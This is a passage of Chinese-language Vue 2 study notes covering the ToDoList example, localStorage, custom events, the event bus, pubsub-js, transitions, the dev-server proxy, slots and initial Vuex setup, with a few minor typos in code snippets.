                // todoObj.done = !todoObj.done
                this.todos.forEach(item => {
                    if(item.id === id) item.done = !item.done
                })
            }
        }
    }
</script>
```

`MyList.vue`

```vue
<template>
  <ul class="todo-main">
    <MyItem
            v-for="item in todos"
            :key="item.id"
            :todoObj="item"
            :checkTodo="checkTodo"
    ></MyItem>
  </ul>
</template>

<script>
    import MyItem from './MyItem.vue'

    export default {
        name: "MyList",
        components: {
            MyItem
        },
        props: {
            todos: {
                type: Object
            },
            checkTodo: {
                type: Function
            }
        }
    }
</script>
```

`MyItem.vue`

```vue
<template>
  <li>
    <label>
      <input type="checkbox"
             :checked="todoObj.done"
             @change="handleCheck(todoObj.id)">
      <span>{{todoObj.title}}</span>
    </label>
    <button class="btn btn-danger" style="display: none">删除</button>
  </li>
</template>

<script>
    export default {
        name: "MyItem",
        props: {
            todoObj: {
                type: Object
            },
            checkTodo: {
                type: Function
            }
        },
        methods: {
            handleCheck(id) {
              this.checkTodo(id)
            }
        }
    }
</script>
```

#### 3.11.1.5.删除功能

由于选择器优先级的问题，要将`App`组件中写在`#root`中的`.btn`、`.btn-danger`样式抽离到同一层级

`App.vue`

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo"></MyHeader>
        <MyList
            :todos="todos"
            :checkTodo="checkTodo"
            :deleteTodo="deleteTodo"
        ></MyList>
        <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyHeader from './components/MyHeader.vue'
import MyList from './components/MyList.vue'
import MyFooter from './components/MyFooter.vue'

export default {
  name: 'App',
  components: {
    MyHeader,
    MyList,
    MyFooter
  },
  data() {
    return {
      todos: [
        {id: '001', title: '吃饭', done: true},
        {id: '002', title: '睡觉', done: true},
        {id: '003', title: '打豆豆', done: false},
      ]
    }
  },
  methods: {
    addTodo(todoObj) {
      this.todos.push(todoObj)
    },
    checkTodo(id) {
      // todoObj.done = !todoObj.done
      this.todos.forEach(item => {
        if (item.id === id) item.done = !item.done
      })
    },
    deleteTodo(id) {
      this.todos = this.todos.filter(item => item.id !== id)
    }
  }
}
</script>
```

`MyList.vue`

```vue
<template>
  <ul class="todo-main">
    <MyItem
        v-for="item in todos"
        :key="item.id"
        :todoObj="item"
        :checkTodo="checkTodo"
        :deleteTodo="deleteTodo"
    ></MyItem>
  </ul>
</template>

<script>
import MyItem from './MyItem.vue'

export default {
  name: "MyList",
  components: {
    MyItem
  },
  props: {
    todos: {
      type: Object
    },
    checkTodo: {
      type: Function
    },
    deleteTodo: {
      type: Function
    }
  }
}
</script>
```

`MyItem.vue`

```vue
<template>
  <li>
    <label>
      <input type="checkbox"
             :checked="todoObj.done"
             @change="handleCheck(todoObj.id)">
      <span>{{todoObj.title}}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todoObj.id)">删除</button>
  </li>
</template>

<script>
export default {
  name: "MyItem",
  props: {
    todoObj: {
      type: Object
    },
    checkTodo: {
      type: Function
    },
    deleteTodo: {
      type: Function
    }
  },
  methods: {
    handleCheck(id) {
      this.checkTodo(id)
    },
    handleDelete(id) {
      if(confirm('确定删除吗？')) {
        console.log(id)
        this.deleteTodo(id)
      }
    }
  }
}
</script>
```

#### 3.11.1.6.底部统计功能

数组过滤方法：`reduce`，https://www.jianshu.com/p/ce508fade509

`MyFooter`

```vue
<template>
  <div class="todo-footer">
    <label>
      <input type="checkbox">
    </label>
    <span>
      <span>已完成{{doneTotal}}</span> / 全部{{todos.length}}
    </span>
    <button class="btn btn-danger">清空已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "MyFooter",
  props: {
    todos: {
      type: Object
    }
  },
  computed: {
    doneTotal() {
      return this.todos.reduce((pre, current) => pre + (current.done ? 1 : 0), 0)
    }
  }
}
</script>
```



#### 3.11.1.7.底部交互功能

`App.vue`

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo"></MyHeader>
        <MyList
            :todos="todos"
            :checkTodo="checkTodo"
            :deleteTodo="deleteTodo"
        ></MyList>
        <MyFooter
            :todos="todos"
            :checkAllDone="checkAllDone"
            :clearAllToDo="clearAllToDo"
        ></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyHeader from './components/MyHeader.vue'
import MyList from './components/MyList.vue'
import MyFooter from './components/MyFooter.vue'

export default {
  name: 'App',
  components: {
    MyHeader,
    MyList,
    MyFooter
  },
  data() {
    return {
      todos: [
        {id: '001', title: '吃饭', done: true},
        {id: '002', title: '睡觉', done: true},
        {id: '003', title: '打豆豆', done: false},
      ]
    }
  },
  methods: {
    addTodo(todoObj) {
      this.todos.push(todoObj)
    },
    checkTodo(id) {
      this.todos.forEach(item => {
        if (item.id === id) item.done = !item.done
      })
    },
    deleteTodo(id) {
      this.todos = this.todos.filter(item => item.id !== id)
    },
    checkAllDone(done) {
      this.todos.forEach(item => item.done = done)
    },
    clearAllToDo(){
      this.todos = this.todos.filter(item => !item.done)
    }
  }
}
</script>
```

`MyFooter.vue`

```vue
<script>
export default {
  name: "MyFooter",
  props: {
    todos: {
      type: Object
    },
    checkAllDone: {
      type: Function
    },
    clearAllToDo: {
      type: Function
    }
  },
  computed: {
    isAll: {
      get() {
        return this.total === this.doneTotal && this.total > 0
      },
      set(value) {
        this.checkAllDone(value)
      }
    },
    total() {
      return this.todos.length
    },
    doneTotal() {
      return this.todos.reduce((pre, current) => pre + (current.done ? 1 : 0), 0)
    }
  },
  methods: {
    clearAll() {
      this.clearAllToDo()
    }
  }
}
</script>
```

### 3.11.2.小结：`ToDoList`案例

- 组件化编码流程
  - 拆分静态组件：组件要按功能点拆分，命名不要和`html`冲突
  - 实现动态组件：考虑好数据存放位置，数据是一个组件在用，还是一些组件在用
    - 一个组件在用：放在组件自身即可
    - 一些组件在用：放在他们共同的父组件上（状态提升）
  - 交互实现：从绑定事件开始

- `props`适用于：
  - 父组件 ==> 子组件通信
  - 子组件 ==> 父组件通信（要求父组件先给子组件一个函数）

- 使用`v-model`时要切记：`v-model`绑定的值不能是`props`传过来的值，因为`props`是不可以修改的
- `props`传过来的若是对象类型的值，修改对象中的属性时`Vue`不会报错，但不推荐这样做

### 3.11.3.浏览器本地存储

`webStorage`包含`localStorage`和`sessionStorage`，这两个的`api`是一样的，存储内容大小一般在`5MB`左右，浏览器端一般通过`Window.sessionStorage`和`Window.localStorage`来实现本地存储机制

相关`api`：

```js
// 新增数据
localStorage.setItem('msg', 'hello')

// 移除数据
localStorage.removeItem('msg')

const p = {
    name: 'sai',
    age: 18
}


// 新增对象类型数据
localStorage.setItem('person', JSON.stringify(p))

// 读取对象类型的数据
const res = localStrage.getItem('person')
console.log(JSON.parse(res))

// 清空所有数据
localStorage.clear()

```

备注：

- `sessionStorage`存储的内容会随着浏览器的窗口关闭而消失
- `localStorage`存储的内容，需要手动清除才会消失
- `xxx.getItem(xxx)`，如果获取不到，返回值为`null`
- `JSON.parse(null)`的结果依然是`null`

## 3.12.组件自定义事件

### 3.12.1.组件自定义事件的基本使用

之前我们通过`props`配置项，可以实现子组件给父组件传递数据，这种方式需要父组件先定义方法，子组件再定义`props`接受，然后再使用该方法

也可以通过`v-on`给组件绑定自定义事件：

- 子组件使用`v-on`绑定`myMethod`自定义事件，该事件的回调是`demo`

  `App.vue`

  ```vue
  <Student v-on:myMethod="demo"/>
  ```

- 父组件中定义`demo`回调函数，子组件中定义`myMethod`自定义事件

  `App.vue`

  ```vue
  <template>
    <div id="root">
      <MyStudent  @myMethod="demo"></MyStudent>
    </div>
  </template>
  <script>
      import MyStudent from "@/components/MyStudent";
      export default {
          name: 'App',
          components: {
              MyStudent
          },
          methods: {
              demo(value) {
                  console.log(value)
              }
          }
      }
  </script>
  ```

  注意：

  - 在子组件标签上，不应该写括号带形参，父组件直接在`methods`配置项里，就可以拿到参数

  - 如果写了`@myMethod="demo(val)"`反而会报错，这里传递的是父级标签上下文的变量。虽然这种写法不会传递子组件数据，但可以触发子组件的事件回调

  - 应用场景：
  
    ```vue
    // 子组件
        selectChange(val) {
          // console.log(this.dataSelectValue);
          this.$emit("selectGetValue", val);
          this.$emit("selectChange");
          //   this.getCounterByDays(val);
        },
            
    // 父组件
    <el-table-column type="expand" width="55">
                    <template slot-scope="props">
                      <!-- <span>{{ props.row}}</span> -->
                      <div class="loading" v-show="!singleBarX.length"></div>
                      <div class="expand-container">
                        <SelectCard
                          class="select-card"
                          @selectGetValue="selectGetValue"
                          @selectChange="selectChange(props.row)"
                        />
                        <div
                          class="expand-chart"
                          style="width: 100%; height: 300px"
                          :ref="props.row.job_id"
                          v-show="singleBarX.length"
                        ></div>
                      </div>
                    </template>
                  </el-table-column>
    
    
        selectGetValue(val) {
          console.log(val);
        },
        selectChange(valParenet) {
          console.log(valParenet)
        },
    ```
  
    子组件发射了两个同时触发的事件，`selectGetValue`获取到的是子组件传过来的值，`selectChange`传递了使用了另一个作用域插槽的值
  
  `MyStudent`
  
  子组件中通过组件实例对象上的`$emit`向外传递自定义事件，同时也可以传递参数
  
  父组件在接受定义回调时，可以定义参数接受子组件的传值
  
  ```vue
  <template>
    <div>
      <button @click="myClick">点击传值</button>
    </div>
  </template>
  
  <script>
      export default {
          name: "MyStudent",
          data() {
              return {
                name: '子组件的数据'
              }
          },
          methods: {
              myClick() {
                  this.$emit('myMethod', this.name)
              }
          }
      }
  </script>
  ```
  
  

另外一种写法：

在`App.vue`中的`mounted`生命周期函数中，使用组件实例对象的`$on`方法调用：

```vue
<template>
	<Student ref="student"/>
</template>
<script>
    export default {
        methods: {
            demo(value) {
                console.log(value)
            }
        }
        mounted() {
            this.$refs.student.$on('myMethod', this.demo)
        }
    }
</script>
```

该方式灵活性更强，比如可以设置延时



如果想要自定义事件只触发一次，可以使用`$once`方法:

```js
this.$refs.student.$once('myMethod', this.demo)
```

或

```vue
<Student @myMethod.once="demo"/>
```



如果子组件自定义事件传递了很多参数，而我们只需要特定的参数，可以使用解构赋值来接受参数

```js
myClick() {
    this.$emit('myMethod', this.name, 'a', 'b', 'c')
}
```

父组件的回调函数：

```js
demo(value, ...params) {
    console.log(value, params) // value对象第一个传递进来的参数
}
```

### 3.12.2.解绑自定义事件

- 解绑一个自定义事件

  ```js
  this.$off('myMethod')
  ```

- 解绑多个自定义事件

  ```js
  this.$off(['myMethod','myMethod2'])
  ```

  或

  ```js
  this.$off() // 什么都不传，表示解绑全部的自定义事件
  ```

- 销毁了当前组件实例之后，其身上定义的所有自定义事件都失效了



### 3.12.3.小结：组件自定义事件

- 一种组件间通信的方式，适用于子组件 ==> 父组件

- 使用场景：`A`是父组件，`B`是子组件，`B`想给`A`传数据，那么就要在`A`中给`B`绑定自定义事件（事件的回调函数在`A`中）

- 绑定自定义事件

  - 第一种方式：在父组件中：`<Demo @myMethod="demo"/>`或`<Demo v-on:myMethod="demo">`

  - 第二种方式，在父组件中：

    ```js
    <Demo ref="xxx"/>
        
    ...
    
    mounted() {
        this.$refs.xxx.$on('myMethod', this.demo)
    }
    ```

  - 若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法

- 触发自定义事件：`this.$emit('myMethod', data)`

- 解绑自定义事件：`this.$off('myMethod')`

- 组件上也可以绑定原生`dom`事件，但要使用`native`修饰符，否则会当作自定义事件处理

- 注意：通过`this.$refs.xxx.$on('myMethod', 回调)`绑定自定义事件时，回调要么配置在`methods`中，要么就用箭头函数，如果不用箭头函数，此时函数中的`this`指向默认指向子组件，对于数据的操作会出问题

- 可以使用自定义事件改写`toDoList`案例

  - 父给子传数据，不用修改
  - 父给子传函数，最终的目标是希望拿到子组件的数据，可以使用子组件的自定义事件来修改

## 3.13.全局事件总线

作用：实现任意组件通信

要求：

- **所有**的组件都能看到它
- 事件总线上得有`$on`、`$off`和`$emit`方法



小结：

- 全局事件总线，是一种组件间通信的方式，适用于任意组件间通信

- 安装全局事件总线

  ```vue
  new Vue({
      ...
  	beforeCreate() {
      	Vue.prototype.$bus = this // 安装全局事件总线，$bus就是当前应用的`vm`
  	}
      ...
  })
  ```

- 使用事件总线

  - 接收数据：`A`组件想接收数据，则在`A`组件中给`$bus`绑定自定义事件，事件的回调留在`A`组件自身

    `A`组件

    ```js
    methods: {
        demo(data) {
            // 事件的回调
        }
    },
    ...
    mounted() {
        this.$bus.$on('xxx', this.demo)
    }
    ```

  - 合适的时机，提供数据：`this.$bus.$emit('xxx', data)`

- 最好在`beforeDestroy`钩子中，用`$off`去解绑当前组件所用到的事件

  `A`组件

  ```js
  ...
  mounted() {
      this.$bus.$on(xxx, this.demo)
  }
  // 销毁前解绑用到的自定义事件
  beforeDestroy() {
      this.$bus.$off('xxx')
  }
  ```

- 使用全局事件总线，改写`toDoList`案例



## 3.14.消息订阅与发布

消息订阅与发布

- 订阅消息：消息名
- 发布消息：消息内容

下载安装：`npm i pubsub-js -D`

在`A`组件中订阅消息

```vue
<template>
  <div id="app">
    <School/>
  </div>
</template>

<script>
  import School from './views/School.vue';
  import pubsub from 'pubsub-js'
  export default {
    name: 'App',
    components: {
      School
    },
    mounted() {
      this.pubid = pubsub.subscribe('hello', (mesName, data) => {
        console.log('有人发布了hello消息，hello消息的回调执行了', mesName, data, this)
      })
    },
    beforeDestroy() {
      pubsub.unsubscribe(this.pubid)
    }
  }
</script>
<style>

</style>

```

在`B`组件中发布消息

```vue
<template>
  <div>
    Hello
    <button @click="publishMes">发布消息</button>
  </div>
</template>
<script>
import pubsub from 'pubsub-js'

export default {
  name: 'School',
  methods: {
    publishMes() {
      pubsub.publish('hello', 666)
    }
  }
}
</script>
<style scoped>


</style>

```

小结：消息订阅与发布

- 一种组件间通信的方式

- 使用步骤

  - 安装`pubsub`：`npm i pubsub-js -D`

  - 引入：`import pubsub from 'pubsub-js'`

  - 接收数据：`A`组件想接收数据，则在`A`组件中订阅消息，订阅的回调留在`A`组件本身

    ```js
    methods: {
        demo(mesName, data) {
            // 默认是有两个参数，一个是消息名称，一个是消息内容
        }
    }
    mounted() {
        // 需要在组件实例上，添加pid属性，销毁该条消息的时候要用到
        this.pid = pubsub.subscribe('xxx', this.demo)
    }
    ```

  - 提供数据：`pubsub.publish('xxx', data)`

    - 最好在`beforeDestroy`钩子中，使用`pubsub.unsubscribe(pid)`<span style="color:red">取消订阅</span>

- 消息订阅模式，在`Vue`中用的不多，因为其原理和事件总线类似

- 可以使用消息订阅模式，改写`toDoList`案例的删除功能

- 新增`toDoList`编辑功能

`this.$nextTick`，可以指定一个回调，在下一次`dom`节点更新之后再执行

什么时候用：当数据改变后，要基于更新后的新`dom`进行某些操作时，要在`$nextTick`所指定的回调函数中执行

```js
this.$nextTick(function () {
    this.$refs.inputTitle.focus()
})
```

## 3.15.动画与过渡

### 3.15.1.动画效果

原生实现动画效果：

```vue
<template>
  <div>
    <button @click="isShow = !isShow">click</button>
    <h2 v-show="isShow" class="go">你好呀</h2>
  </div>
</template>

<script>
  export default {
    name: 'Test',
    data() {
      return {
        isShow: true
      }
    }
  }
</script>

<style scoped lang="less">
  h2 {
    background-color: orange;
  }

  .come {
    animation: come 1s linear;
  }
  .go {
    animation: come 1s linear reverse;
  }
  @keyframes come {
    from {
      transform: translateX(-100%);
    }
    to {
      transform: translateX(0);
    }
  }
</style>
```

后续逻辑是不断的切换`come`和`go`的类名

`Vue`就封装了上述的操作

- 使用`transistion`包裹想要发生动画的元素
  - 这样`Vue`就会在合适的时候，加上固定的动画（类名）
- `v-enter-active`
  - 进入的整个过程，添加的样式类名
- `v-leave-active`
  - 离开的整个过程，添加的样式类名
- `Vue`不和动画进行对话，只和样式的类名进行对话
- 注意：`transition`只针对被`v-show`或`v-if`控制的元素

```vue
<template>
  <div>
    <button @click="isShow = !isShow">click</button>
    <transition>
      <h2 v-show="isShow" class="go">你好呀</h2>
    </transition>
  </div>
</template>

<script>
  export default {
    name: 'Test',
    data() {
      return {
        isShow: true
      }
    }
  }
</script>

<style scoped lang="less">
  h2 {
    background-color: orange;
  }

  .v-enter-active {
    animation: come 1s linear;
  }
  .v-leave-active {
    animation: come 1s linear reverse;
  }
  @keyframes come {
    from {
      transform: translateX(-100%);
    }
    to {
      transform: translateX(0);

    }
  }



</style>
```

- 每个过渡还可以命名，命名后样式的类名要对应上

  ```vue
      <transition name="hello">
        <h2 v-show="isShow" class="go">你好呀</h2>
      </transition>
  ```

  ```css
    .hello-enter-active {
      animation: come 1s linear;
    }
    .hello-leave-active {
      animation: come 1s linear reverse;
    }
  ```

- 如果希望一开始就播放动画，给`transition`添加一个`appear`属性，有两种写法

  ```vue
      <transition name="hello" :appear="true">
        <h2 v-show="isShow" class="go">你好呀</h2>
      </transition>
  ```

  或者是简写形式

  ```vue
      <transition name="hello" appear>
        <h2 v-show="isShow" class="go">你好呀</h2>
      </transition>
  ```

- 值得注意的是，`transition`并不会渲染成真实`dom`

### 3.15.2.过渡效果

元素出现的过程中，`Vue`除了添加`v-enter-active`，还添加了`v-enter`和`v-enter-to`这两个类名

- `v-enter`：进入的起点
- `v-enter-to`：进入的终点

相当于封装了原生的`transition`的写法

同理，元素离开的过程中，`Vue`还会添加`v-leave`和`v-leave-to`这两个类名，分别表示离开的起点、离开的终点

```vue
<template>
  <div>
    <button @click="isShow = !isShow">click</button>
    <transition name="hello" appear>
      <h2 v-show="isShow" class="go">你好呀</h2>
    </transition>
  </div>
</template>

<script>
  export default {
    name: 'Test',
    data() {
      return {
        isShow: true
      }
    }
  }
</script>

<style scoped lang="less">
  h2 {
    background-color: orange;
    transition: 0.5s linear;
  }
  .hello-enter, .hello-leave-to {
    transform: translateX(-100%);
  }
  .hello-enter-to, .hello-leave {
    transform: translateX(0);
  }
</style>
```

为了不破坏原来元素中，写的样式，我们将`transition: 0.5s linear;`抽出来

```css
<style scoped lang="less">
  h2 {
    background-color: orange;
  }

  .hello-enter-active, .hello-leave-active {
    transition: 0.5s linear; /* 元素在进入及隐藏的整个过程，都会有这个属性值 */
  }
  .hello-enter, .hello-leave-to {
    transform: translateX(-100%);
  }
  .hello-enter-to, .hello-leave {
    transform: translateX(0);
  }
</style>
```

上面的写法就相当于写在了变化的元素身上

### 3.15.3.多个元素的过渡

使用`<transition-group>`标签包裹多个元素，同时要指定`key`，其他的不变

```vue
<transition-group>
	<div key="1"></div>
	<div key="2"></div>
	<div key="3"></div>
</transition-group>
```

`key`值可以借助`v-for`来指定或手动指定

### 3.15.4.第三方动画库

`animate.css`：[Animate.css | A cross-browser library of CSS animations.](https://animate.style/)

安装：`npm i animate.css -D`

组件或入口文件中引入：

```js
import 'animate.css'
```

初始化配置：

```vue
<transition name="animate__animated animate__bounce">

</transition>
```

动画配置

```vue
<transition
            appear
            name="animate__animated animate__bounce"
            enter-active-class="animate__fadeIn"
            leave-active-class="animate__fadeOut"
            >
    <div v-show="isShow" class="animate__fast">
        
    </div>
</transition>
```

即可实现动画效果

如果要控制时间，给被`v-show`控制的元素添加类名即可

```
Class name	Default speed time
animate__slow	2s
animate__slower	3s
animate__fast	800ms
animate__faster	500ms
```



### 3.15.5.小结：`Vue`封装的过渡与动画

- 作用：在插入、更新或移除`dom`时，在合适的时机给元素添加类名

- 图示：

  ![image-20220531200443590](image-20220531200443590.png)

- 写法：

  - 准备好样式：
    - 元素进入的样式
      - `v-enter`：进入的起点
      - `v-enter-active`：进入的整个过程
      - `v-enter-to`：进入的终点
    - 元素离开的样式
      - `v-leave`：离开的起点
      - `v-leave-active`：离开的整个过程
      - `v-leave-to`：离开的终点
    
  - 使用`<transition>`包裹要过渡的元素，并配置`name`属性
  
    ```vue
    <transition>
    	<h1 v-show="isShow">
            你好
        </h1>
    </transition>
    ```
  
  - 备注：若有多个元素需要过渡，则需要使用：`<transition-group>`，且每个元素都要指定`key`
  
  - 使用`<transition>`完善`toDoList`案例

# 4.`Vue`中的`ajax`

## 4.1.`vue-cli`中配置代理

使用`ajax`技术，发送请求可能会存在跨域问题

本机的浏览器是8080，直接向服务器5000请求数据是不行的，可以通过本机的服务器8080这个代理服务器发请求

服务器和服务器之间，发送请求是不存在跨域问题的，跨域问题只存在于浏览器端

那么怎么开启代理服务器呢？

- 通过`nginx`配置代理服务器

- 通过`vue-cli`的配置项

  - 方式一：

    `vue.config.js`

    新增配置项`devServer`

    ```js
    devServer: {
        proxy: "http://localhost:5000" //配置成最终要请求的服务器
    }
    ```

    填写该配置项后，`vue-cli`会生成一个8080的服务器，并且开发的`public`目录，对应着该服务器的资源目录，`ajax`的**请求路径，要修改成代理服务的**

    优点：

    - 配置简单，请求资源直接发给前端即可

    存在的问题：

    - 不能配置多个代理服务器，不能灵活的控制请求是否走代理
    - 如果请求路径和`public`目录资源存在重复，则会返回代理服务的的资源，请求不会转发

  - 方式二：

    `vue.config.js`

    ```js
    devServer: {
        proxy: {
            '/api': { // 表示请求前缀，发送`ajax`请求时，在端口号后添加该前缀，表示要通过代理服务器进行转发，并且该前缀，会作为请求路径发送给目标服务器
                target: '<url>', // 代理服务器的路径
                pathRewrite: {
                    '^/api': '' // 对路径进行匹配替换，将前缀替换为空字符串，如果真实的服务器有这个路径头，就不需要重写
                },
                ws: true, // 用于支持websocket
                changeOrigin: true // true配置项，会伪装代理服务的主机端口号，是localhost:5000。false配置项，代理服务器会如实告诉目标服务器自己的主机端口号，是localhost:8080
            },
            '/foo': {
                target: '<other_url>',
                pathRewrite: {
                    '^/foo': ''
                }
            }
        }
    }
    ```

    优点：

    - 可以配置多个代理，且可以灵活的控制请求是否走代理

    缺点：

    - 配置略微繁琐，请求资源时必须加前缀

- `baseUrl`要修改成`vue-cli`生成的8080（默认）的ip，不能写成目标接口ip，或者直接置空也行

- 如果接口是通过本地隧道转发的，8080在后台接口服务器上启动，代理才会通，如果是在另一台机器上的开发环境，代理不会生效

  - vue-cli只会帮你从`localhost:8080`去访问配置完隧道后的`localhost:7989`（配置完隧道的接口地址），虽然浏览器访问没问题，这是因为`WindTerm`监听了端口，帮你做了转发

    ![image-20221205165534097](image-20221205165534097.png)

  - 而在代码里，相当于是本机的8080直接去请求本机的9878，这个动作`WindTerm`是不会在代码里给你监听的

    ![image-20221205170101371](image-20221205170101371.png)

  - 同样的配置，如果前台代码放在接口服务器上，代理请求是没问题的

    ![image-20221205170211489](image-20221205170211489.png)

> vite中配置：[开发服务器选项 | Vite 官方中文文档 (vitejs.dev)](https://cn.vitejs.dev/config/server-options.html#server-proxy)

## 4.2.带有网络请求的案例

`github`搜索用户案例

## 4.3.`Vue`中常用的两个`ajax`库

### 4.3.1.`axios`

通用的`ajax`库，官方推荐，使用广泛

### 4.3.2.`vue-resource`

`vue`插件库，`vue1.x`广泛使用，官方已不维护

## 4.4.`slot`插槽

组件标签里面的标签体，也可以添加内容的

```vue
<Demo>
    <!--标签体内容-->
	<h1>
    </h1>
</Demo>
```

`vue`会对标签体内容进行解析，但是要确定解析后的存放位置

在子组件中，使用`<slot>`标签标识，告诉`vue`使用`Demo`组件时，其标签体内容放在`slot`对应的位置（挖个坑，等待组件的使用者来填）

传递`slot`的时机是，在组件使用者全部加载完之后，再替换`slot`

### 4.4.1.默认插槽

`slot`可以定义默认值，如果使用组件时没有添加标签体内容，页面渲染时会展示`slot`的默认内容

`Demo.vue`

```vue
<template>
	<div>
        <slot>我是一些默认值，当使用者没穿传递组件标签提内容时，我们显示出来</slot>
    </div>
</template>
```

### 4.4.2.具名插槽

理解：挖了坑之后，给每个坑取个名字，将来在使用的时候，确定哪个结构到哪个坑里

定义具名插槽

`Demo.vue`

```vue
<template>
	<div>
        <slot name="center">我是一些默认值，当使用者没穿传递组件标签提内容时，我们显示出来</slot>
        <slot name="footer">我是一些默认值，当使用者没穿传递组件标签提内容时，我们显示出来</slot>
    </div>
</template>
```

使用插槽

`App.vue`

```vue
<template>
	<div>
		<Demo>
    		<img slot="center" src="...">
            <a slot="footer">...</a>
            <a slot="footer">...</a> //这里是追加，不会覆盖
    	</Demo>
    </div>
</template>
```

如果是多个标签内容，对应同一个插槽，外层可以使用一个`div`或`template`包裹

使用`div`进行包裹

```vue
<template>
	<div>
		<Demo>
    		<img slot="center" src="...">
            <div slot="footer">
            	<a>...</a>
            	<a>...</a>
   			</div>
    	</Demo>
    </div>
</template>
```

使用`template`进行包裹时，可以使用`v-slot:footer`的写法

```vue
<template>
	<div>
		<Demo>
    		<img slot="center" src="...">
            <template v-slot:footer>
            	<a>...</a>
            	<a>...</a>
   			</template>
    	</Demo>
    </div>
</template>
```

### 4.4.3.作用域插槽

默认操作和具名插槽，解决了**结构传递**的问题。

现在要解决**数据传递**的问题



`Demo`组件的使用者，在使用`Demo`组件时，可以将数据存放在本身

但现在将数据放在`Demo`组件中，如果使用者想要用到`Demo`组件中的数据，需要在定义插槽的时候，`Demo`组件往插槽上塞一份数据

`Demo.vue`

```vue
<template>
	<div>
        <slot :games="games" msg="hello">我是一些默认值</slot>
    </div>
</template>
<script>
	export default {
        data() {
            return {
                games: [
                    'a',
                    'b'
                ]
            }
        }
    }
</script>
```

那么定义插槽时，数据塞给了谁呢？

塞给了插槽的使用者

`App.vue`

```vue
<template>
	<div>
		<Demo>
			<template scope="receive"> <!-- 该名称可以随意定义 -->
                {{receive}}
                <ul>
                    <li v-for="itme in receive.games">{{item}}</li>
    			</ul>
			</template>
    	</Demo>
    </div>
</template>
```

页面显示的结果，是一个对象：

```
{
    games: [
        'a',
        'b'
    ],
    message: "hello"
}
```

使用者在用的时候，通过`scope`定义的变量名进行调用即可

可以通过对象的解构赋值来简化调用过程的书写



```vue
<template>
	<div>
		<Demo>
			<template scope="{games}">
                {{receive}}
                <ul>
                    <li v-for="item in games">{{item}}</li>
    			</ul>
			</template>
    	</Demo>
    </div>
</template>
```

也可以写成`slot-scope={games}`，就是新旧`api`的问题



数据是定义在作用域插槽对应的组件中的，最终的结构是由组件的使用者决定的

### 4.4.4.小结：插槽

- 作用：让父组件可以向子组指定位置插入`html`结构，也是一种组件间通信方式，适用于`父组件`==> `子组件`

- 分类：默认插槽、具名插槽和作用域插槽

- 使用方式：

  - 默认插槽：

    ```vue
    父组件中：
    	<Category>
    		<div>
                html结构1
            </div>
    	</Category>
    ```

    ```vue
    子组件中：
    	<template>
    		<div>
                 <!-- 定义插槽 -->
                <slot>插槽默认内容</slot>
            </div>
    	</template>
    ```

  - 具名插槽：

    ```vue
    父组件中：
    	<Category>
    		<template slot="center">
    			<div>
                    html结构1
                </div>
            </template>
            
            <template v-slot="footer">
    			<div>
                    html结构2
                </div>
            </template>
    	</Category>
    ```

    ```vue
    子组件中：
    	<template>
    		<div>
                 <!-- 定义插槽 -->
                <slot name="center">插槽默认内容</slot>
                <slot name="footer">插槽默认内容</slot>
            </div>
    	</template>
    ```

  - 作用域插槽

    - 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要使用者来决定</span>。（`games`数据在`Category`中，但使用数据所遍历出来的结构由`App`组件决定）

      ```vue
      父组件中：
      	<Category>
      		<template scope="scopeData">
      			<!-- 生成的是ul列表 -->
      			<ul>
                      <li v-for="g in scopeData" :key="g">{{g}}</li>
                  </ul>
              </template>
      	</Category>
      
      	<Category>
      		<template scope="scopeData">
      			<!-- 生成的是h4标题 -->
      			<h4 v-for="g in scopeData" :key="g">
                      {{g}}
                  </h4>
              </template>
      	</Category>
      ```

      ```vue
      子组件中：
      	<template>
      		<div>
                  <slot :game="games"></slot>
              </div>
      	</template>
      	<script>
      		export default {
                  // 数据在子组件自身
                  data() {
                      return {
                          games: ['aa', 'bb', 'cc']
                      }
                  }
              }
      	</script>
      ```

# 5.`vuex`

## 5.1.理解`vuex`

### 5.1.1.`vuex`是什么

- 概念：专门在`Vue`中实现集中式状态（数据）管理的一个`Vue`插件，对`Vue`应用中多个组价的共享状态进行集中的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。
- `github`：https://github.com/vuejs/vuex
- 官方现在推荐的是`pinia`了：https://github.com/vuejs/pinia 

### 5.1.2.什么时候使用`vuex`

- 多个组件依赖于同一状态
- 来自不同组件的行为需要变更同一状态

### 5.1.3.`vuex`原理图

![image-20220601141825764](image-20220601141825764.png)

### 5.1.4.搭建`vuex`环境及使用

- `vue2`中，只能够用`vuex`的3版本
- `vue3`中，只能用`vuex`的4及以上版本

创建`store`

`store/index.js`

```js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex) // 需要先安装插件，再创建实例

export default new Vuex.Store({
  state: {
  },
  getters: {
  },
  mutations: {
  },
  actions: {
  },
  modules: {
  }
})

```

`main.js`中引入

```js
import Vue from 'vue'
import App from './App.vue'
import store from './store' // 默认会找index.js文件

Vue.config.productionTip = false

new Vue({
  store, // 安装完vuex插件后，store配置项才会出现在vm实例上
  render: h => h(App)
}).$mount('#app')

```

此时，`vm`实例身上就有`$store`方法了

![image-20220601144453228](image-20220601144453228.png)



使用：

- 将需要共享的数据定义在`state`

  ```js
    state: {
      sum: 0
    },
  ```

- 在组件实例对象中，调用`dispatch`方法

  ```js
  this.$store.dispath('jia', this.n) // 传入action类型，并根据需要传入其他参数
  ```

- 在`actions`中定义类型

  ```js
  actions: {
      jia: function() {
      	console.log('store中的jia被调用了')
      }
  }
  
  
  actiosn: {
      //简写
      jia(context, value) {
          // 有两个默认参数
          // 第一个参数，相当于是mini版的store对象，有commit、dispatch、getters和state等
          	// 如果业务逻辑很多的话，可以再次调用dispatch方法进行业务逻辑分发
          	// 为什么业务逻辑不写在自身呢？
          		// 实现代码复用
          		// 实际业务逻辑会有多个步骤流程，不可能用一次写一次逻辑，
          		// 比如说想要报销，只要传递一个发票号即可，剩下的一大堆验证逻辑，不需要自己管了
          // 第二个参数，是传过来的值
          	// 虽然在这里，可以直接操作state的值，但是不推荐，因为vuex的开发者工具监测的是mutation
      }
  }
  ```

- 自定义类型函数里，调用`commit`方法

